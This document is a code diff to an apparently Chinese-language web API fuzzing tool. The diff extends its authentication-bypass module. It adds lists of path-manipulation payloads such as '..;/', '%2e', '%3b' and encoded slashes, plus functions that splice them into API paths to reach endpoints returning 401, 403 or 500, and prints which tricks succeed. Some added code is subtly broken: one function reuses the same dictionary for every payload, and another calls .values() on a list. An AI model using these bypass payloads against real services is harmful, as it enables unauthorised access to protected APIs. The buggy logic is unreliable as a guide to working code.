@@ -149,10 +149,11 @@ indexKeywordsLowConfidence=[#以分值的方式计算总分值，取较大者为
 
 outputStatusCodeQueue=[200,405,500,403,401,404,400,502,0]
 blackstatuscode=[502,500,403,401,404]#过滤敏感接口
+#todo 302是否要进行bypass测试
 bypassstatuscode=[#todo 目前仅针对500响应进行绕过
     500,
-    #403,
-    #401,
+    403,
+    401,
 ]#bypass目标标记状态码
 blackstatuscodeforbypasscompare=[
     500,
@@ -173,7 +174,43 @@ logoutKeywordList=[#退出登录接口关键词库
 
 bypassTechList=[#绕过tech库
         ";",
+        "..",
+        "xxxx;/..",
+        "xxxx/..;",
+        ".;",
+        ".",
+        "%2e",
+        "/",
+        "%2f",
     ]
+bypassTailMergeTechList=[#尾部拼接tech库
+    "/",
+    "//",
+    "/*",
+    "/*/",
+    "/.",
+    "/./",
+    "/./",
+    "/./.",
+    "?",
+    "??",
+    "???",
+    "..;/",
+    "/..;/",
+    "%20/",
+    "%09/",
+    "/%2e%2e/",
+    "/%2e%2e",
+    "/%2e/",
+    "/%2e",
+    "/a%25%32%66a",
+]
+
+bypassInsertIntoList=[#内部插入tech库
+    "%3b",
+    # ";",
+]
+#todo 这里还差尾部拼接和内部插入两种方式
 
 #爬取实现
 resultJs=[]
@@ -204,6 +241,7 @@ def readFileIntoList(filename):
 #debug信息输出
 def debugger(info,name=""):
     if DEBUG:
+        print()
         if name:
             print(f"debugger: {name}: {info}")
         else:
@@ -2184,6 +2222,84 @@ class apiFuzz:
             return tmp
         return
 
+    #尾部拼接
+    def getBypassListWithTagUsingTailMerge(self,origionUrl,preBypassApiListWithTag,technique=[]):
+        #technique=[{"tech":"tech","pos":-1}]
+        #[{"url":url,"tag":"preBypass","tech":"","pos":-1,"bypassapi":"","api":api}]
+        #输入[{"url":resp["url"],"tag":"preBypass","tech":"","pos":0,"bypassapi":"","api":resp["api"]}]
+        # delimiter="/"
+        tmp=[]
+        cleanurl=getCleanUrl(origionUrl)
+        if not technique:
+            techs=bypassTailMergeTechList
+            for _ in preBypassApiListWithTag:
+                _["pos"]=-1
+                for tech in techs:
+                    _["tech"]=tech
+                    _["bypassapi"]=_["api"].strip()+tech
+                    _["url"]=cleanurl+_["bypassapi"]
+                    tmp.append(_)
+        else:
+            techs=[v["tech"] for v in technique.values() if "tech" in v.keys()]
+            for _ in preBypassApiListWithTag:
+                _["pos"]=-1
+                for tech in techs:
+                    _["tech"]=tech
+                    _["bypassapi"]=_["api"].strip()+tech
+                    _["url"]=cleanurl+_["bypassapi"]
+                    tmp.append(_)
+        if tmp:
+            return tmp
+        return
+    #内部插入
+    def getBypassListWithTagByInsertInto(self,origionUrl,preBypassApiListWithTag,technique=[],delimiter="/"):
+        #technique=[{"tech":"tech","pos":0}]
+        #[{"url":url,"tag":"preBypass","tech":"","pos":0,"desc":"insertinto","bypassapi":"","api":api}]
+        cleanurl=getCleanUrl(origionUrl)
+        tmp=[]
+        dup=[]
+        pos=None
+        # if not techs:
+        if not technique:
+            techs=bypassInsertIntoList
+            for tech in techs:
+                for res in preBypassApiListWithTag:
+                    lst=res["api"].strip(delimiter).split(delimiter)
+                    for i in range(len(lst)):
+                        dup=lst.copy()
+                        # dup.insert(i,tech)
+                        dup[i]=tech+dup[i]
+                        bypassapi=delimiter+delimiter.join(dup)
+                        tmpdicc={"url":cleanurl+bypassapi,"tag":"preBypass","tech":tech,"pos":i,"desc":"insertinto","bypassapi":bypassapi,"api":res["api"]}
+                        tmp.append(tmpdicc)
+        else:
+            for _ in technique:
+                tech=_["tech"]
+                pos=_["pos"]
+                for res in preBypassApiListWithTag:
+                    lst=res["api"].strip(delimiter).split(delimiter)
+                    if not isinstance(pos,int):
+                        for i in range(len(lst)):
+                            dup=lst.copy()
+                            # dup.insert(i,tech)
+                            dup[i]=tech+dup[i]
+                            bypassapi=delimiter+delimiter.join(dup)
+                            tmpdicc={"url":cleanurl+bypassapi,"tag":"preBypass","tech":tech,"pos":i,"desc":"insertinto","bypassapi":bypassapi,"api":res["api"]}
+                            tmp.append(tmpdicc)
+                    else:
+                        try:
+                            dup=lst.copy()
+                            # dup.insert(pos,tech)
+                            dup[pos]=tech+dup[pos]
+                            bypassapi=delimiter+delimiter.join(dup)
+                            tmpdicc={"url":cleanurl+bypassapi,"tag":"preBypass","tech":tech,"pos":pos,"desc":"insertinto","bypassapi":bypassapi,"api":res["api"]}
+                            tmp.append(tmpdicc)
+                        except Exception as e:
+                            print(f"{e}")
+        if tmp:
+            return tmp
+        return
+
     # def bypassAuthSpear(self,origionUrl,fuzzResultList,indexres):
     def bypassAuthSpear(self,origionUrl,fuzzResultList):
         """实施常见bypass认证策略尝试进行bypass
@@ -2200,18 +2316,33 @@ class apiFuzz:
         Returns:
             _type_: _description_
         """
-        print()
+        # print()
         print("Bypass in action")
         bypasstarget=[x for x in fuzzResultList if x["status"]["code"] in bypassstatuscode]
         if not bypasstarget:
             print(f"无需要bypass的目标")
             return
+        #*为平衡数量，增加tech，采用抽取20个
+        random.shuffle(bypasstarget)
+        bypasstarget=bypasstarget[:20]
+
         preBypassApiListWithTag=[{"url":resp["url"],"tag":"preBypass","tech":"","pos":0,"bypassapi":"","api":resp["api"]} for resp in bypasstarget]
         #[{"url":url,"tag":"preBypass","tech":"","pos":0,"bypassapi":"","api":api}]
-        preBypassApiListWithTag=self.getBypassListWithTagWithTechAndPos(origionUrl,preBypassApiListWithTag)
+        # preBypassApiListWithTag=self.getBypassListWithTagWithTechAndPos(origionUrl,preBypassApiListWithTag)
+        lsttechpos=self.getBypassListWithTagWithTechAndPos(origionUrl,preBypassApiListWithTag)
+        debugger(lsttechpos,"lsttechpos")
+        lsttailmerge=self.getBypassListWithTagUsingTailMerge(origionUrl,preBypassApiListWithTag)
+        debugger(lsttailmerge,"lsttailmerge")
+        lstinsertinto=self.getBypassListWithTagByInsertInto(origionUrl,preBypassApiListWithTag)
+        debugger(len(lstinsertinto),"lstinsertinto: 个数")
+        debugger(lstinsertinto,"lstinsertinto")
+        preBypassApiListWithTag=lsttechpos+lsttailmerge+lstinsertinto
+        #平衡500次内容上限，洗牌完成全部tech测试
         if not preBypassApiListWithTag:
             print(f"bypass待测列表无效")
             return
+        random.shuffle(preBypassApiListWithTag)
+        print(f"待测试bypass payload总量: {len(preBypassApiListWithTag)} 个")
         #循环bypass测试
         start = 0
         end = 100
@@ -2259,16 +2390,27 @@ class apiFuzz:
                     #             validBypassTech.append(bypasser)
                     if bypasstest["status"]["type"]!="html":
                         if bypasstest["status"]["size"]!=compare["status"]["size"]:
-                            bypasser={"tech":bypasstest["tech"],"pos":bypasstest["pos"]}
+                            # bypasser={"tech":bypasstest["tech"],"pos":bypasstest["pos"]}
+                            # try:
+                            #     bypasser={"tech":bypasstest["tech"],"pos":bypasstest["pos"],"desc":bypasstest["desc"]}
+                            # except:
+                            #     bypasser={"tech":bypasstest["tech"],"pos":bypasstest["pos"],"desc":""}
+                            bypasser={"tech":bypasstest["tech"],"pos":bypasstest["pos"],"desc":bypasstest["desc"]}
                             # if DEBUG:
                             #     print()
                             #     print(f"bypass成功: new: bypassapi: {bypasstest['bypassapi']} code: {bypasstest['status']['code']} size: {bypasstest['status']['size']} type: {bypasstest['status']['type']} tech: '{bypasstest['tech']}' pos: {bypasstest['pos']}")
                             #     print(f"bypass成功: old: api: {compare['api']} code: {compare['status']['code']} size: {compare['status']['size']} type: {compare['status']['type']}")
                             #     # print(f"bypass成功: old: compare: {compare}")
                             #     print()
+                            # print(f"bypass成功: new: bypassapi: {bypasstest['bypassapi']} code: {bypasstest['status']['code']} size: {bypasstest['status']['size']} type: {bypasstest['status']['type']} tech: '{bypasstest['tech']}' pos: {bypasstest['pos']}")
+                            # print(f"bypass成功: old: api: {compare['api']} code: {compare['status']['code']} size: {compare['status']['size']} type: {compare['status']['type']}")
                             print()
-                            print(f"bypass成功: new: bypassapi: {bypasstest['bypassapi']} code: {bypasstest['status']['code']} size: {bypasstest['status']['size']} type: {bypasstest['status']['type']} tech: '{bypasstest['tech']}' pos: {bypasstest['pos']}")
-                            print(f"bypass成功: old: api: {compare['api']} code: {compare['status']['code']} size: {compare['status']['size']} type: {compare['status']['type']}")
+                            if bypasstest['desc']:
+                                print(f"bypass成功: new: bypassapi: {bypasstest['bypassapi']} code: {bypasstest['status']['code']} size: {bypasstest['status']['size']} type: {bypasstest['status']['type']} tech: '{bypasstest['tech']}' pos: {bypasstest['pos']} desc: {bypasstest['desc']}")
+                                print(f"bypass成功: old: api: {compare['api']} code: {compare['status']['code']} size: {compare['status']['size']} type: {compare['status']['type']}")
+                            else:
+                                print(f"bypass成功: new: bypassapi: {bypasstest['bypassapi']} code: {bypasstest['status']['code']} size: {bypasstest['status']['size']} type: {bypasstest['status']['type']} tech: '{bypasstest['tech']}' pos: {bypasstest['pos']}")
+                                print(f"bypass成功: old: api: {compare['api']} code: {compare['status']['code']} size: {compare['status']['size']} type: {compare['status']['type']}")
                             # print(f"bypass成功: old: compare: {compare}")
                             # print()
                             validBypassTech.append(bypasser)
@@ -2277,7 +2419,8 @@ class apiFuzz:
             end += step
             count+=1
             loop+=1
-            if loop==5:#无论是否命中bypass tech 都跑5次
+            # if loop==5:#无论是否命中bypass tech 都跑5次
+            if loop==10:#加入更多tech，提高上限至10次
                 break
         if validBypassTech:
             validBypassTech=self.fastUniqDicList(validBypassTech)
@@ -2285,7 +2428,12 @@ class apiFuzz:
             # print()
             print(f"定位到可用bypass tech")
             for _ in validBypassTech:
-                print(f"tech: '{_['tech']}' pos: {_['pos']}")
+                # print(f"tech: '{_['tech']}' pos: {_['pos']}")
+                #*适配内部插入绕过方式
+                if _["desc"]:
+                    print(f"tech: '{_['tech']}' pos: {_['pos']} desc: {_['desc']} eg. /aaaa/%3bcccc")
+                else:
+                    print(f"tech: '{_['tech']}' pos: {_['pos']}")
             return validBypassTech
         else:
             # if DEBUG:
@@ -2398,6 +2546,7 @@ class apiFuzz:
             #[{"url":url,"tag":"fingerprint","api":api}]
             return suspiciousApi
         if not suspiciousApi:
+            print()
             print("输入模式:指纹识别结束，未发现有效api")
         return
     #配置根识别
@@ -2601,13 +2750,16 @@ class apiFuzz:
                 if apisfromjson["validApis"]:
                     api="/"+apisfromjson["validApis"][0].strip("/")
                     suspiciousApi.append({"url":cleanurl+api,"tag":"json","api":api})
+                    print()
                     for finger in suspiciousApi:
                         print(f"命中api: {finger['api']} 命中指纹: {finger['tag']} 命中url: {finger['url']}")
                     return suspiciousApi
             else:
                 if "nofuzz" not in mode:
+                    print()
                     print("指纹识别结束，未发现有效api")
                 else:
+                    print()
                     print("nofuzz模式:指纹识别结束，未发现有效api")
         return
     #tag
@@ -2766,7 +2918,7 @@ class apiFuzz:
             # for i in range(10):
             #     noneapi="/"+self.generate_random_string(8)
             #     nonelist.append({"url":cleanUrl+noneapi,"tag":"nonenoneApi","api":noneapi})
-        print()
+        # print()
         apiResult={"inputApis":inputApis,"validApis":[],"suspiciousAPis":[]}
         cleanUrl=getCleanUrl(origionUrl)
         # apiList.append("/")#添加根
@@ -2798,7 +2950,7 @@ class apiFuzz:
         tmp=sorted(self.fastUniqList(tmp))
         print()
         print(f"api总计 {len(tmp)} 个: {tmp}")
-        print()
+        # print()
         mergeApis=self.inputApisMerge(tmp,apiList)
         mergeApisListWithTag=self.fastUniqDicList([{"url":url,"tag":"mergeApis","api":url} for url in mergeApis])
         fuzzingList=mergeApisListWithTag.copy()
@@ -2838,7 +2990,7 @@ class apiFuzz:
                 sublist.append({"url":cleanUrl+nonenoneapi,"tag":"cleanUrlApi","api":nonenoneapi})
                 if DEBUG:
                     print(f"孤单输入:拼接锚点根")
-            # print()
+            print()
             if "nofuzz" in mode:
                 print(f"nofuzz:第 {count+1} 批次fuzz: 数量: {len(sublist)} 个")
             else:
@@ -3057,6 +3209,7 @@ class apiFuzz:
         self.standardTaskStatusOutput(mode,singlestatus)
         
         if DEBUG:
+            print()
             print(f"单fuzz:发包次数: {len(countspider)} 次")
         batchcountspider+=countspider
         countspider=[]#置空
@@ -3171,7 +3324,12 @@ class apiFuzz:
                         print()
                         print(f"Bypass: 定位到可用bypass tech")
                         for _ in status["bypasser"]:
-                            print(f"tech: '{_['tech']}' pos: {_['pos']}")
+                            # print(f"tech: '{_['tech']}' pos: {_['pos']}")
+                            #* 适配内部插入绕过方式输出
+                            if _["desc"]:
+                                print(f"tech: '{_['tech']}' pos: {_['pos']} desc: {_['desc']} eg. /aaaa/%3bcccc")
+                            else:
+                                print(f"tech: '{_['tech']}' pos: {_['pos']}")
                     else:
                         print()
                         print(f"Bypass: 未发现可用bypass tech")
@@ -3186,7 +3344,7 @@ class apiFuzz:
                 # print()
                 # print(f"命中: [200]: {counter[200]} 次 [405]: {counter[405]} 次 [500]: {counter[500]} 次 [403]: {counter[403]} 次 [401]: {counter[401]} 次 [404]: {counter[404]} 次")
                 print(f"命中: [200]: {counter[200]} 次 [405]: {counter[405]} 次 [500]: {counter[500]} 次 [403]: {counter[403]} 次 [401]: {counter[401]} 次 [404]: {counter[404]} 次 [400]: {counter[400]} 次 [502]: {counter[502]} 次")
-                print()
+                # print()
 
         else:
             print(f"未发现有效api")
@@ -3267,7 +3425,7 @@ class apiFuzz:
         """
         #*返回#{"target":origionUrl,"juicyApiList":juicyApiList,"sensitivInfoList":sensitivInfoList,"sensitiveFileList":sensitiveFileList,"apiFigureout":{"inputApis":[inputApis],"validApis":[validApis],"suspiciousAPis":[suspiciousAPis]},"fingerprint":[{"url":url,"tag":"fingerprint","api":api}],"tag":"default","dead","alive"}
         singlestatus={"target":origionUrl,"juicyApiList":[],"sensitivInfoList":[],"sensitiveFileList":[],"apiFigureout":{"inputApis":[],"validApis":[],"suspiciousAPis":[]},"fingerprint":[],"tag":"default","dead":"alive"}
-        print()
+        # print()
         #前后端分离情况的后端地址输入实现 不考虑输入多个不同IP的情况
         tmpinputapipaths=apiPaths.copy()
         for i in range(len(tmpinputapipaths)):
@@ -3341,8 +3499,11 @@ class apiFuzz:
                 print(f"指定api待处理数量: {len(urlFuzzList)}")
             filename=".js_fuzz_url.txt"
             writeLinesIntoFile(urlFuzzList,filename)
-            if DEBUG:
-                print(f"fuzz目标总数: {len(urlFuzzList)}")
+            # if DEBUG:
+            #     print(f"fuzz目标总数: {len(urlFuzzList)}")
+            print()
+            # print(f"fuzz目标总数: {len(urlFuzzList)}")
+            print(f"响应获取: fuzz目标总数: {len(urlFuzzList)}")
             #todo 测试中 大量的访问会导致后续访问全部timeout
             if threadsConf:
                 threads=threadsConf
@@ -3456,10 +3617,24 @@ class apiFuzz:
                         # print(f"定位到可用bypass tech")
                         # for _ in bypasser:
                         #     print(f"tech: {_['tech']} pos: {_['pos']}")
+                        tailmergebypasser=[x for x in bypasser if x["pos"]==-1]
+                        insertintobypasser=[x for x in bypasser if x["desc"]]
+                        # normalbypasser=[x for x in bypasser if x not in tailmergebypasser and x not in insertintobypasser]
+                        normalbypasser=[x for x in bypasser if x not in tailmergebypasser and x not in insertintobypasser]
                         _=[x for x in fuzzResultList if x["status"]["code"] in bypassstatuscode]
                         preBypassApiListWithTagToGetResponse=[{"url":resp["url"],"tag":"preBypass","tech":"","pos":0,"bypassapi":"","api":resp["api"]} for resp in _]
                         #[{"url":url,"tag":"preBypass","tech":"","pos":0,"bypassapi":"","api":api}]
-                        preBypassApiListWithTagToGetResponse=self.getBypassListWithTagWithTechAndPos(origionUrl,preBypassApiListWithTagToGetResponse,bypasser)
+                        # preBypassApiListWithTagToGetResponse=self.getBypassListWithTagWithTechAndPos(origionUrl,preBypassApiListWithTagToGetResponse,bypasser)
+                        normallistforresp=[]
+                        if normalbypasser:
+                            normallistforresp=self.getBypassListWithTagWithTechAndPos(origionUrl,preBypassApiListWithTagToGetResponse,normalbypasser)
+                        tailmergelistforresp=[]
+                        if tailmergebypasser:
+                            tailmergelistforresp=self.getBypassListWithTagUsingTailMerge(origionUrl,preBypassApiListWithTagToGetResponse,tailmergebypasser)
+                        insertintolistforreps=[]
+                        if insertintobypasser:
+                            insertintolistforreps=self.getBypassListWithTagByInsertInto(origionUrl,preBypassApiListWithTagToGetResponse,insertintobypasser)
+                        preBypassApiListWithTagToGetResponse=normallistforresp+tailmergelistforresp+insertintolistforreps
                         print()
                         print(f"根据bypass tech获取响应")
                         #*[{"url":url,"status":{"code":code,"size":content_size,"type":contentType,"title":page_title,"locationcode":[],"location":[],"locationtimes":0},"resp":resp,"tag":tag,"tech":"","pos":0,"bypassapi":"","oriapi":"oriapi","api":"api"}]
@@ -4172,7 +4347,7 @@ class apiFuzz:
         #* 不会过滤响应，所有相应都会输出
         ele {"url":url,"tag":"preBypass","tech":"","pos":0,"bypassapi":"","api":api}
         列表形式
-        #*[{"url":url,"status":{"code":code,"size":content_size,"type":contentType,"title":page_title,"locationcode":[],"location":[],"locationtimes":0},"resp":resp,"tag":tag,"tech":"","pos":0,"bypassapi":"","api":"api"}]
+        #*[{"url":url,"status":{"code":code,"size":content_size,"type":contentType,"title":page_title,"locationcode":[],"location":[],"locationtimes":0},"resp":resp,"tag":tag,"tech":"","pos":0,"desc":"insertinto","bypassapi":"","api":"api"}]
         """
         singlestatus={}
         countspider.append(1)#统计发包次数
@@ -4238,7 +4413,11 @@ class apiFuzz:
             statusCount["rightCount"].append(1)#命中
             #{"url":url,"tag":"preBypass","tech":"","pos":0,"bypassapi":"","api":api}
             #*[{"url":url,"status":{"code":code,"size":content_size,"type":contentType,"title":page_title,"locationcode":[],"location":[],"locationtimes":0},"resp":resp,"tag":tag,"tech":"","pos":0,"bypassapi":"","api":"api"}]
-            singlestatus={"url":ele['url'],"status":respStatus,"resp":resp,"tag":ele['tag'],"tech":ele["tech"],"pos":ele["pos"],"bypassapi":ele["bypassapi"],"api":ele["api"]}
+            # singlestatus={"url":ele['url'],"status":respStatus,"resp":resp,"tag":ele['tag'],"tech":ele["tech"],"pos":ele["pos"],"bypassapi":ele["bypassapi"],"api":ele["api"]}
+            try:
+                singlestatus={"url":ele['url'],"status":respStatus,"resp":resp,"tag":ele['tag'],"tech":ele["tech"],"pos":ele["pos"],"desc":ele["desc"],"bypassapi":ele["bypassapi"],"api":ele["api"]}
+            except:
+                singlestatus={"url":ele['url'],"status":respStatus,"resp":resp,"tag":ele['tag'],"tech":ele["tech"],"pos":ele["pos"],"desc":"","bypassapi":ele["bypassapi"],"api":ele["api"]}
             lst.append(singlestatus)
         except requests.exceptions.Timeout as e:
             # timeoutCount+=1
@@ -4282,7 +4461,7 @@ class apiFuzz:
         #* 不会过滤响应，所有相应都会输出
         ele {"url":url,"tag":"preBypass","tech":"","pos":0,"bypassapi":"","api":api}
         列表形式
-        #*[{"url":url,"status":{"code":code,"size":content_size,"type":contentType,"title":page_title,"locationcode":[],"location":[],"locationtimes":0},"resp":resp,"tag":tag,"tech":"","pos":0,"bypassapi":"","oriapi":"oriapi","api":"api"}]
+        #*[{"url":url,"status":{"code":code,"size":content_size,"type":contentType,"title":page_title,"locationcode":[],"location":[],"locationtimes":0},"resp":resp,"tag":tag,"tech":"","pos":0,"desc":"insertinto","bypassapi":"","oriapi":"oriapi","api":"api"}]
         """
         singlestatus={}
         countspider.append(1)#统计发包次数
@@ -4348,7 +4527,11 @@ class apiFuzz:
             statusCount["rightCount"].append(1)#命中
             #{"url":url,"tag":"preBypass","tech":"","pos":0,"bypassapi":"","api":api}
             #*[{"url":url,"status":{"code":code,"size":content_size,"type":contentType,"title":page_title,"locationcode":[],"location":[],"locationtimes":0},"resp":resp,"tag":tag,"tech":"","pos":0,"bypassapi":"","oriapi":"oriapi","api":"api"}]
-            singlestatus={"url":ele['url'],"status":respStatus,"resp":resp,"tag":ele['tag'],"tech":ele["tech"],"pos":ele["pos"],"bypassapi":ele["bypassapi"],"oriapi":ele["api"],"api":ele["bypassapi"]}
+            # singlestatus={"url":ele['url'],"status":respStatus,"resp":resp,"tag":ele['tag'],"tech":ele["tech"],"pos":ele["pos"],"bypassapi":ele["bypassapi"],"oriapi":ele["api"],"api":ele["bypassapi"]}
+            try:
+                singlestatus={"url":ele['url'],"status":respStatus,"resp":resp,"tag":ele['tag'],"tech":ele["tech"],"pos":ele["pos"],"desc":ele["desc"],"bypassapi":ele["bypassapi"],"oriapi":ele["api"],"api":ele["bypassapi"]}
+            except:
+                singlestatus={"url":ele['url'],"status":respStatus,"resp":resp,"tag":ele['tag'],"tech":ele["tech"],"pos":ele["pos"],"desc":"","bypassapi":ele["bypassapi"],"oriapi":ele["api"],"api":ele["bypassapi"]}
             lst.append(singlestatus)
         except requests.exceptions.Timeout as e:
             # timeoutCount+=1
